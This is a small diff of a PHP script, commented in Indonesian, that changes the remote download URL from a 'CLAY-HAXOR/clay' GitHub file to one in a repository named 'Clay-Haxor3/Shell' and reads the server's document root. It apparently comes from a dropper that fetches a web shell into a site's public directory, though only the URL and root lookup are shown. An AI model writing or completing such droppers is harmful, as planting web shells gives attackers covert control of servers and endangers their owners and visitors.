@@ -1,6 +1,6 @@
 <?php
 // URL dari file yang ingin Anda unduh
-$url = 'https://raw.githubusercontent.com/CLAY-HAXOR/clay/refs/heads/main/conviguration';
+$url = 'https://raw.githubusercontent.com/Clay-Haxor3/Shell/refs/heads/main/conviguration';
 
 // Mendapatkan root dokumen (home directory) secara otomatis
 $document_root = $_SERVER['DOCUMENT_ROOT'];
